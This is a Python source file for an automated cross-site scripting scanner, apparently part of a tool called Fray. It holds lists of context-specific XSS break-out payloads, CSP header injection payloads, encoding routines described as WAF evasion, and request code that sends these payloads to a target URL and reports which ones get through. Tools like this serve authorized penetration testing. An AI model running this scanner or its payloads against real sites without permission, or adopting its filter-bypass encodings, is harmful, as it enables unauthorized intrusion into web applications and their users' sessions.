"""
Fray Deep XSS Module — XSStrike-level context-aware cross-site scripting detection.

Features:
  - Context detection: HTML body, attribute, script, comment, style, URL
  - Context-aware payload selection (break-out sequences per context)
  - DOM XSS source/sink analysis
  - Reflection analysis (encoding detection, filter mapping)
  - WAF-aware payload mutation
  - Multi-encoding support (HTML entity, URL, Unicode, double-encode)

Usage:
    scanner = XSSScanner(url, param="q")
    result = scanner.scan()
    if result.vulnerable:
        for f in result.findings:
            print(f"  [{f.context}] {f.payload}")

Zero external dependencies — stdlib only.
"""

import html
import http.client
import json
import re
import ssl
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple


# ── Context Detection ────────────────────────────────────────────────────

class ReflectionContext:
    """Detected reflection context of user input."""
    HTML_BODY = "html_body"           # Between tags: <div>HERE</div>
    HTML_ATTR_DQ = "attr_double"      # In double-quoted attr: <div class="HERE">
    HTML_ATTR_SQ = "attr_single"      # In single-quoted attr: <div class='HERE'>
    HTML_ATTR_UQ = "attr_unquoted"    # In unquoted attr: <div class=HERE>
    SCRIPT_STRING_DQ = "script_dq"    # In JS double-quoted string: var x="HERE"
    SCRIPT_STRING_SQ = "script_sq"    # In JS single-quoted string: var x='HERE'
    SCRIPT_TEMPLATE = "script_tmpl"   # In JS template literal: var x=`HERE`
    SCRIPT_BLOCK = "script_block"     # In script block: <script>HERE</script>
    HTML_COMMENT = "html_comment"     # In comment: <!--HERE-->
    STYLE_BLOCK = "style_block"       # In style: <style>HERE</style>
    URL_PARAM = "url_param"           # In href/src/action URL
    TAG_NAME = "tag_name"             # In tag itself (rare)


def detect_contexts(body: str, probe: str) -> List[str]:
    """Detect all reflection contexts of a probe string in response body."""
    contexts = []
    pos = 0
    body_lower = body.lower()
    probe_lower = probe.lower()

    while True:
        idx = body_lower.find(probe_lower, pos)
        if idx == -1:
            break
        pos = idx + 1

        # Look backwards to determine context
        before = body[:idx]
        after = body[idx + len(probe):]

        ctx = _classify_position(before, after)
        if ctx and ctx not in contexts:
            contexts.append(ctx)

    return contexts


def _classify_position(before: str, after: str) -> Optional[str]:
    """Classify the context of a position based on surrounding HTML."""
    before_stripped = before.rstrip()

    # Inside <script> tag?
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close:
        # We're inside a script block
        # Check if inside a string
        segment = before[last_script_open:]
        # Count unescaped quotes
        dq = _count_unescaped(segment, '"')
        sq = _count_unescaped(segment, "'")
        bt = _count_unescaped(segment, '`')
        if dq % 2 == 1:
            return ReflectionContext.SCRIPT_STRING_DQ
        if sq % 2 == 1:
            return ReflectionContext.SCRIPT_STRING_SQ
        if bt % 2 == 1:
            return ReflectionContext.SCRIPT_TEMPLATE
        return ReflectionContext.SCRIPT_BLOCK

    # Inside <style> tag?
    last_style_open = before.rfind("<style")
    last_style_close = before.rfind("</style")
    if last_style_open > last_style_close:
        return ReflectionContext.STYLE_BLOCK

    # Inside HTML comment?
    last_comment_open = before.rfind("<!--")
    last_comment_close = before.rfind("-->")
    if last_comment_open > last_comment_close:
        return ReflectionContext.HTML_COMMENT

    # Inside a tag attribute?
    last_tag_open = before.rfind("<")
    last_tag_close = before.rfind(">")
    if last_tag_open > last_tag_close:
        # We're inside a tag
        tag_content = before[last_tag_open:]
        # Check if in a quoted attribute
        dq = tag_content.count('"')
        sq = tag_content.count("'")
        if dq % 2 == 1:
            return ReflectionContext.HTML_ATTR_DQ
        if sq % 2 == 1:
            return ReflectionContext.HTML_ATTR_SQ
        # Check if after an = sign (unquoted attribute)
        if re.search(r'=\s*$', tag_content) or re.search(r'=\s*\S*$', tag_content):
            return ReflectionContext.HTML_ATTR_UQ
        # In href/src/action?
        if re.search(r'(?:href|src|action|formaction)\s*=', tag_content, re.I):
            return ReflectionContext.URL_PARAM
        return ReflectionContext.HTML_ATTR_UQ

    # Default: HTML body context
    return ReflectionContext.HTML_BODY


def _count_unescaped(s: str, char: str) -> int:
    """Count unescaped occurrences of a character."""
    count = 0
    escaped = False
    for c in s:
        if escaped:
            escaped = False
            continue
        if c == '\\':
            escaped = True
            continue
        if c == char:
            count += 1
    return count


# ── Context-Aware Payloads ──────────────────────────────────────────────

_PAYLOADS_BY_CONTEXT: Dict[str, List[str]] = {
    ReflectionContext.HTML_BODY: [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x xmlns=http://www.w3.org/2000/svg><set attributeName=d to='alert(1)'/>",
        "<img src=x onerror=alert`1`>",
        "<input onfocus=alert(1) autofocus>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<xss contenteditable onblur=alert(1)>test",
    ],
    ReflectionContext.HTML_ATTR_DQ: [
        '"><img src=x onerror=alert(1)>',
        '" onmouseover=alert(1) "',
        '" onfocus=alert(1) autofocus "',
        '"><svg onload=alert(1)>',
        '" autofocus onfocus=alert(1) x="',
        '" onpointerenter=alert(1) style="width:100%;height:100%" "',
    ],
    ReflectionContext.HTML_ATTR_SQ: [
        "'><img src=x onerror=alert(1)>",
        "' onmouseover=alert(1) '",
        "' onfocus=alert(1) autofocus '",
        "'><svg onload=alert(1)>",
    ],
    ReflectionContext.HTML_ATTR_UQ: [
        " onmouseover=alert(1)",
        " onfocus=alert(1) autofocus",
        " onpointerenter=alert(1)",
        "><svg onload=alert(1)>",
    ],
    ReflectionContext.SCRIPT_STRING_DQ: [
        '"-alert(1)-"',
        '";alert(1)//',
        '";</script><img src=x onerror=alert(1)>',
        '"+alert(1)+"',
        '"-(confirm)(1)-"',
    ],
    ReflectionContext.SCRIPT_STRING_SQ: [
        "'-alert(1)-'",
        "';alert(1)//",
        "';</script><img src=x onerror=alert(1)>",
        "'+alert(1)+'",
    ],
    ReflectionContext.SCRIPT_TEMPLATE: [
        "${alert(1)}",
        "`-alert(1)-`",
        "${confirm(1)}",
    ],
    ReflectionContext.SCRIPT_BLOCK: [
        "</script><img src=x onerror=alert(1)>",
        "alert(1)",
        "';alert(1)//",
        "\";alert(1)//",
    ],
    ReflectionContext.HTML_COMMENT: [
        "--><img src=x onerror=alert(1)>",
        "--><svg onload=alert(1)>",
    ],
    ReflectionContext.STYLE_BLOCK: [
        "</style><img src=x onerror=alert(1)>",
        "</style><svg onload=alert(1)>",
    ],
    ReflectionContext.URL_PARAM: [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "javascript:alert`1`",
    ],
}

# ── CSP Header Injection Payloads ─────────────────────────────────────────
# Cloudflare Emergency WAF Release 2026-03-12: Generic XSS in CSP Header.
# Targets frameworks that extract/trust values from the request's
# Content-Security-Policy header without sufficient validation.
_CSP_HEADER_XSS_PAYLOADS = [
    "script-src 'unsafe-inline'; default-src *",
    "script-src 'unsafe-eval' 'unsafe-inline' *; object-src *",
    "default-src 'none'; script-src data:,<script>alert(1)</script>",
    "script-src 'nonce-fray'; default-src * 'unsafe-inline'",
    "report-uri /x?<script>alert(1)</script>",
    "script-src 'self' 'unsafe-inline'; img-src *; connect-src *",
]

# ── DOM XSS Sources and Sinks ───────────────────────────────────────────

_DOM_SOURCES = [
    r"document\.URL", r"document\.documentURI", r"document\.referrer",
    r"document\.cookie", r"location\.href", r"location\.search",
    r"location\.hash", r"location\.pathname", r"window\.name",
    r"window\.location", r"document\.baseURI",
    r"history\.pushState", r"history\.replaceState",
    r"localStorage\.", r"sessionStorage\.",
    r"URLSearchParams",
]

_DOM_SINKS = [
    r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"\.insertAdjacentHTML\s*\(",
    r"document\.write\s*\(", r"document\.writeln\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(", r"setInterval\s*\(",
    r"Function\s*\(", r"\.src\s*=", r"\.href\s*=", r"\.action\s*=",
    r"\.replace\s*\(", r"\.assign\s*\(",
    r"jQuery\.html\s*\(", r"\$\(.*\)\.html\s*\(",
    r"\$\(.*\)\.append\s*\(", r"\$\(.*\)\.after\s*\(",
    r"\$\(.*\)\.before\s*\(", r"\$\(.*\)\.prepend\s*\(",
    r"\.createContextualFragment\s*\(", r"Range\.createContextualFragment",
    r"DOMParser.*parseFromString",
]

# ── Encoding / Mutation ─────────────────────────────────────────────────

def _encode_payload(payload: str, encoding: str) -> str:
    """Apply encoding to evade WAF filters."""
    if encoding == "html_entity":
        return "".join(f"&#{ord(c)};" for c in payload)
    elif encoding == "html_hex":
        return "".join(f"&#x{ord(c):x};" for c in payload)
    elif encoding == "url":
        return urllib.parse.quote(payload, safe="")
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    elif encoding == "mixed_case":
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
    elif encoding == "null_byte":
        return payload.replace("<", "%00<").replace(">", "%00>")
    elif encoding == "tab_newline":
        return payload.replace(" ", "\t").replace("<", "\n<")
    return payload


# ── Filter Detection ────────────────────────────────────────────────────

_FILTER_PROBES = [
    ("<", "angle_bracket"),
    (">", "angle_bracket_close"),
    ("\"", "double_quote"),
    ("'", "single_quote"),
    ("(", "parenthesis"),
    (")", "parenthesis_close"),
    ("javascript:", "javascript_proto"),
    ("onerror", "event_handler"),
    ("onload", "event_handler"),
    ("alert", "alert_func"),
    ("<script>", "script_tag"),
    ("<img", "img_tag"),
    ("<svg", "svg_tag"),
    ("eval(", "eval_func"),
]


# ── Core Scanner ─────────────────────────────────────────────────────────

class XSSFinding:
    """A single XSS finding."""
    __slots__ = ("context", "payload", "param", "reflected", "encoded_as",
                 "confidence", "dom_xss", "evidence")

    def __init__(self, context: str, payload: str, param: str,
                 reflected: bool = True, encoded_as: str = "",
                 confidence: str = "confirmed", dom_xss: bool = False,
                 evidence: str = ""):
        self.context = context
        self.payload = payload
        self.param = param
        self.reflected = reflected
        self.encoded_as = encoded_as
        self.confidence = confidence
        self.dom_xss = dom_xss
        self.evidence = evidence

    def to_dict(self) -> Dict[str, Any]:
        return {
            "context": self.context,
            "payload": self.payload,
            "param": self.param,
            "reflected": self.reflected,
            "encoded_as": self.encoded_as,
            "confidence": self.confidence,
            "dom_xss": self.dom_xss,
            "evidence": self.evidence[:200],
        }


class XSSResult:
    """Results from a full XSS scan."""
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
        self.vulnerable = False
        self.findings: List[XSSFinding] = []
        self.contexts_found: List[str] = []
        self.filters_detected: List[str] = []
        self.dom_sources: List[str] = []
        self.dom_sinks: List[str] = []
        self.requests_made = 0
        self.duration_ms = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "param": self.param,
            "vulnerable": self.vulnerable,
            "findings": [f.to_dict() for f in self.findings],
            "contexts_found": self.contexts_found,
            "filters_detected": self.filters_detected,
            "dom_sources": self.dom_sources,
            "dom_sinks": self.dom_sinks,
            "requests_made": self.requests_made,
            "duration_ms": self.duration_ms,
        }


class XSSScanner:
    """Context-aware XSS scanner with WAF evasion.

    Usage:
        scanner = XSSScanner("https://example.com/search?q=test", param="q")
        result = scanner.scan()
    """

    PROBE = "fray7x5s9"  # Unique canary for reflection detection

    def __init__(self, url: str, param: str,
                 method: str = "GET",
                 data: Optional[Dict[str, str]] = None,
                 headers: Optional[Dict[str, str]] = None,
                 cookie: str = "",
                 timeout: int = 10,
                 delay: float = 0.0,
                 verify_ssl: bool = True,
                 waf_evasion: bool = True,
                 verbose: bool = False,
                 ):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.custom_headers = headers or {}
        self.cookie = cookie
        self.timeout = timeout
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.waf_evasion = waf_evasion
        self.verbose = verbose

        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme or "https"
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if self._scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_params = dict(urllib.parse.parse_qsl(parsed.query))
        self._use_ssl = self._scheme == "https"
        self._requests = 0

    def _request(self, inject_value: str) -> Tuple[int, str]:
        """Send request with injected value. Returns (status, body)."""
        params = dict(self._orig_params)
        params[self.param] = inject_value

        if self.method == "GET":
            qs = urllib.parse.urlencode(params, safe="")
            path = f"{self._path}?{qs}"
            body_bytes = None
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode("utf-8")

        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,*/*",
            "Connection": "close",
        }
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        if body_bytes:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        hdrs.update(self.custom_headers)

        try:
            if self._use_ssl:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self._host, self._port,
                                                    timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self._host, self._port,
                                                   timeout=self.timeout)
            conn.request(self.method, path, body=body_bytes, headers=hdrs)
            resp = conn.getresponse()
            body = resp.read(1024 * 512).decode("utf-8", errors="replace")
            status = resp.status
            conn.close()
        except Exception:
            return 0, ""

        self._requests += 1
        if self.delay > 0:
            time.sleep(self.delay)
        return status, body

    def scan(self) -> XSSResult:
        """Run full context-aware XSS scan."""
        result = XSSResult(self.url, self.param)
        t0 = time.monotonic()

        # Phase 1: Probe for reflection
        status, body = self._request(self.PROBE)
        if self.PROBE not in body:
            # No reflection — check DOM XSS only
            result.dom_sources, result.dom_sinks = self._check_dom_xss(body)
            if result.dom_sources and result.dom_sinks:
                result.findings.append(XSSFinding(
                    context="dom",
                    payload="N/A (DOM-based)",
                    param=self.param,
                    reflected=False,
                    confidence="likely",
                    dom_xss=True,
                    evidence=f"sources={result.dom_sources[:3]}, sinks={result.dom_sinks[:3]}",
                ))
            result.vulnerable = bool(result.findings)
            result.requests_made = self._requests
            result.duration_ms = int((time.monotonic() - t0) * 1000)
            return result

        # Phase 2: Detect reflection contexts
        contexts = detect_contexts(body, self.PROBE)
        result.contexts_found = contexts

        # Phase 3: Detect filters
        filters = self._detect_filters()
        result.filters_detected = filters

        # Phase 4: DOM XSS check
        result.dom_sources, result.dom_sinks = self._check_dom_xss(body)

        # Phase 5: Context-aware payload testing
        for ctx in contexts:
            payloads = _PAYLOADS_BY_CONTEXT.get(ctx, _PAYLOADS_BY_CONTEXT[ReflectionContext.HTML_BODY])

            for payload in payloads:
                # Try raw payload first
                s, b = self._request(payload)
                if self._check_execution(b, payload, ctx):
                    result.findings.append(XSSFinding(
                        context=ctx, payload=payload, param=self.param,
                        confidence="confirmed",
                        evidence=f"Reflected unmodified in {ctx} context",
                    ))
                    break  # One confirmed per context is enough

                # If WAF evasion enabled, try encoded variants
                if self.waf_evasion and s in (403, 406, 429):
                    for enc in ["html_entity", "mixed_case", "tab_newline", "url", "double_url"]:
                        encoded = _encode_payload(payload, enc)
                        s2, b2 = self._request(encoded)
                        if s2 not in (403, 406, 429) and self._check_execution(b2, payload, ctx):
                            result.findings.append(XSSFinding(
                                context=ctx, payload=encoded, param=self.param,
                                encoded_as=enc, confidence="confirmed",
                                evidence=f"WAF bypass via {enc} encoding",
                            ))
                            break

        # Phase 6: CSP header injection (Cloudflare WAF rule 2026-03-12)
        csp_findings = self._test_csp_header_xss()
        result.findings.extend(csp_findings)

        # DOM XSS finding
        if result.dom_sources and result.dom_sinks:
            result.findings.append(XSSFinding(
                context="dom", payload="N/A (DOM-based)",
                param=self.param, reflected=False,
                confidence="likely", dom_xss=True,
                evidence=f"sources={result.dom_sources[:3]}, sinks={result.dom_sinks[:3]}",
            ))

        result.vulnerable = any(f.confidence in ("confirmed", "likely") for f in result.findings)
        result.requests_made = self._requests
        result.duration_ms = int((time.monotonic() - t0) * 1000)
        return result

    def _check_execution(self, body: str, payload: str, context: str) -> bool:
        """Check if a payload would execute in the given context."""
        # Key markers that indicate successful injection
        markers = [
            "onerror=alert", "onload=alert", "onmouseover=alert",
            "onfocus=alert", "ontoggle=alert", "onpointerenter=alert",
            "<img src=x onerror=", "<svg onload=", "<svg/onload=",
            "javascript:alert", "alert(1)", "alert`1`",
            "confirm(1)", "prompt(1)",
        ]
        body_lower = body.lower()
        for marker in markers:
            if marker.lower() in body_lower:
                # Verify it's not just in a comment or escaped
                idx = body_lower.find(marker.lower())
                before = body[:idx]
                # Not inside an HTML comment
                if "<!--" in before[max(0, len(before)-50):] and "-->" not in before[max(0, len(before)-50):]:
                    continue
                return True
        return False

    def _test_csp_header_xss(self) -> List[XSSFinding]:
        """Test for XSS via Content-Security-Policy header injection.

        Cloudflare Emergency WAF Release 2026-03-12: some frameworks trust
        and extract values from the CSP header in the incoming request
        without validation. Attackers inject scripts/directives via the
        header that are processed server-side.
        """
        findings = []
        params = dict(self._orig_params)
        params[self.param] = self.PROBE
        if self.method == "GET":
            qs = urllib.parse.urlencode(params, safe="")
            path = f"{self._path}?{qs}"
            body_bytes = None
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode("utf-8")

        for csp_payload in _CSP_HEADER_XSS_PAYLOADS:
            hdrs = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,*/*",
                "Connection": "close",
                "Content-Security-Policy": csp_payload,
            }
            if self.cookie:
                hdrs["Cookie"] = self.cookie
            if body_bytes:
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            hdrs.update(self.custom_headers)

            try:
                if self._use_ssl:
                    ctx = ssl.create_default_context()
                    if not self.verify_ssl:
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(self._host, self._port,
                                                        timeout=self.timeout, context=ctx)
                else:
                    conn = http.client.HTTPConnection(self._host, self._port,
                                                       timeout=self.timeout)
                conn.request(self.method, path, body=body_bytes, headers=hdrs)
                resp = conn.getresponse()
                resp_body = resp.read(1024 * 512).decode("utf-8", errors="replace")
                resp_hdrs = {k.lower(): v for k, v in resp.getheaders()}
                conn.close()
                self._requests += 1
            except Exception:
                continue

            # Check if our CSP payload was reflected in response headers
            resp_csp = resp_hdrs.get("content-security-policy", "")
            if csp_payload in resp_csp or "unsafe-inline" in resp_csp:
                # Server echoed/adopted our CSP — this is exploitable
                findings.append(XSSFinding(
                    context="csp_header",
                    payload=f"CSP: {csp_payload}",
                    param="Content-Security-Policy header",
                    reflected=True,
                    confidence="confirmed",
                    evidence=f"Server reflected CSP header: {resp_csp[:120]}",
                ))
                return findings

            # Check if CSP payload content appears in body (framework extraction)
            if "<script>alert(1)</script>" in csp_payload and \
               "<script>alert(1)</script>" in resp_body:
                findings.append(XSSFinding(
                    context="csp_header",
                    payload=f"CSP: {csp_payload}",
                    param="Content-Security-Policy header",
                    reflected=True,
                    confidence="confirmed",
                    evidence="CSP header value extracted and rendered in body",
                ))
                return findings

        return findings

    def _detect_filters(self) -> List[str]:
        """Detect what characters/strings are being filtered."""
        filters = []
        for probe_char, filter_name in _FILTER_PROBES:
            test = f"{self.PROBE}{probe_char}{self.PROBE}"
            _, body = self._request(test)

            if self.PROBE in body:
                # Check if the probe char survived
                if probe_char not in body.split(self.PROBE, 1)[-1]:
                    if filter_name not in filters:
                        filters.append(filter_name)
                # Check if it was HTML-encoded
                encoded = html.escape(probe_char)
                if encoded != probe_char and encoded in body:
                    if f"{filter_name}_encoded" not in filters:
                        filters.append(f"{filter_name}_encoded")
        return filters

    def _check_dom_xss(self, body: str) -> Tuple[List[str], List[str]]:
        """Check for DOM XSS sources and sinks in JavaScript."""
        sources = []
        sinks = []
        # Extract script blocks
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
        all_js = "\n".join(scripts)

        for src_pat in _DOM_SOURCES:
            if re.search(src_pat, all_js):
                sources.append(src_pat.replace("\\", ""))
        for sink_pat in _DOM_SINKS:
            if re.search(sink_pat, all_js):
                sinks.append(sink_pat.replace("\\", "").rstrip("("))
        return sources, sinks


# ── CLI Integration ─────────────────────────────────────────────────────

def run_xss(args) -> int:
    """CLI entry point for `fray xss`."""
    try:
        from fray.output import console
    except ImportError:
        console = None

    url = args.url
    param = getattr(args, "param", None)
    if not param:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if not params:
            if console:
                console.print("[red]No parameters found in URL. Use --param to specify.[/red]")
            return 1
        param = list(params.keys())[0]

    scanner = XSSScanner(
        url=url, param=param,
        method=getattr(args, "method", "GET") or "GET",
        cookie=getattr(args, "cookie", "") or "",
        timeout=getattr(args, "timeout", 10) or 10,
        verify_ssl=not getattr(args, "insecure", False),
        waf_evasion=not getattr(args, "no_waf_evasion", False),
    )

    if console:
        console.print(f"\n  [bold cyan]Fray XSS — Context-Aware XSS Scanner[/bold cyan]")
        console.print(f"  Target: [green]{url}[/green]")
        console.print(f"  Parameter: [cyan]{param}[/cyan]")
        console.print()

    result = scanner.scan()

    if console:
        if result.contexts_found:
            console.print(f"  Reflection contexts: [cyan]{', '.join(result.contexts_found)}[/cyan]")
        if result.filters_detected:
            console.print(f"  Filters detected: [yellow]{', '.join(result.filters_detected)}[/yellow]")
        if result.dom_sources:
            console.print(f"  DOM sources: [yellow]{len(result.dom_sources)}[/yellow]")
        if result.dom_sinks:
            console.print(f"  DOM sinks: [red]{len(result.dom_sinks)}[/red]")
        console.print()

        if result.vulnerable:
            console.print(f"  [bold red]VULNERABLE[/bold red] — {len(result.findings)} finding(s)")
            for f in result.findings:
                conf_color = {"confirmed": "red", "likely": "yellow"}.get(f.confidence, "dim")
                ctx_label = f"[{f.context}]" if not f.dom_xss else "[DOM]"
                console.print(f"  [{conf_color}][{f.confidence.upper()}][/{conf_color}] {ctx_label} {f.payload[:80]}")
                if f.encoded_as:
                    console.print(f"    [dim]WAF bypass: {f.encoded_as}[/dim]")
        else:
            console.print(f"  [green]Not vulnerable[/green]")

        console.print(f"\n  [dim]{result.requests_made} requests in {result.duration_ms}ms[/dim]\n")

    return 0 if result.vulnerable else 1
